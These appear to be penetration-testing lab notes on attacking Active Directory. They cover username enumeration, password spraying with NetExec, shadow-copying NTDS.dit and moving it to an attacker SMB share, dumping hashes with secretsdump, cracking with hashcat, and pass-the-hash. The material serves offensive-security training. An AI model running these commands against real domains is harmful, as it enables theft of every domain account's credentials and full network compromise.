# Attacking AD and NTDS.dit — Credential Attacks

## Background
When a Windows system joins a domain, authentication requests are validated by the DC rather than the local SAM database. The SAM database is still usable for local accounts (specify `hostname\username` or `.\username` at logon). The NTDS.dit file on domain controllers stores all domain usernames and password hashes — compromising it means compromising every domain account.

**NTDS.dit location:** `%systemroot%/ntds/NTDS.dit` on each DC.

> ⚠️ Dictionary attacks over the network are noisy — they generate significant traffic and alerts, and may trigger account lockout policies.

---

## Phase 1 — Username Enumeration & List Building

### Username Naming Conventions (reference)
| Convention | Example (Jane Jill Doe) |
|---|---|
| First initial + last name | `jdoe` |
| First initial + middle initial + last name | `jjdoe` |
| First name + last name | `janedoe` |
| First.last | `jane.doe` |
| Last.first | `doe.jane` |

**OSINT tips:**
- Google `"@domain.com"` to find real email addresses → infer username format
- Google `"domain.com filetype:pdf"` → PDF properties may expose real usernames
- LinkedIn / company directory for employee names

### Generate username list from real names (Username Anarchy)
```bash
./username-anarchy -i /home/ltnbob/names.txt
```

### Validate usernames against the domain (Kerbrute)
```bash
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```
Uses Kerberos pre-authentication to confirm valid usernames without triggering failed logon events.


---

## Phase 2 — Dictionary Attack Against AD (NetExec)

### Brute-force a known username with a password list
```bash
netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```
- Successful logon appears as `[+]`
- Failed attempts appear as `[-] STATUS_LOGON_FAILURE`
- **Note:** Default Windows domain GPO does **not** enforce account lockout — but custom policies may.
- Netexec could be used to identify the domain

---

## Phase 3 — Gain Access & Check Privileges

### Connect to DC with obtained credentials
```bash
evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'
```

### Check local group membership
```PowerShell
*Evil-WinRM* PS C:\> net localgroup
```

### Check user's domain group membership
```PowerShell
*Evil-WinRM* PS C:\> net user bwilliamson
```
Need **local Administrators** or **Domain Admins** (or equivalent) to copy NTDS.dit.

---

## Phase 4 — Capture NTDS.dit

### Method 1 — Manual VSS approach

**Create a Volume Shadow Copy of C:**
```PowerShell
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```
Note the `Shadow Copy Volume Name` from the output.

**Copy NTDS.dit from the shadow copy:**
```PowerShell
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

**Transfer to attack host via SMB share:**
```PowerShell
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```
> Also grab the SYSTEM hive — hashes in NTDS.dit are encrypted with the key stored in SYSTEM.

**Extract hashes offline:**
```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

### Method 2 — One-liner via NetExec (faster)
```bash
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```
Handles shadow copy creation, NTDS.dit extraction, and download automatically. Output saved to:
```
/home/user/.nxc/logs/DC01_<ip>_<date>.ntds
```
Extract only enabled accounts:
```bash
grep -iv disabled /home/bob/.nxc/logs/DC01_10.129.201.57_*.ntds | cut -d ':' -f1
```

---

## Phase 5 — Crack Hashes or Pass-the-Hash

### Crack a single NT hash with Hashcat (mode 1000)
```bash
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

### If cracking fails — Pass-the-Hash (PtH)
NTLM authentication accepts the hash directly instead of a cleartext password:
```bash
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```
Useful for lateral movement after initial compromise.

---

## Key Takeaways
- NTDS.dit = every domain account's hash → full domain compromise if captured
- VSS allows copying a locked NTDS.dit without taking AD offline
- Always grab the SYSTEM hive alongside NTDS.dit for offline decryption
- NetExec's `-M ntdsutil` automates the entire capture pipeline in one command
- NT hashes can be cracked (Hashcat mode 1000) or used directly for PtH without cracking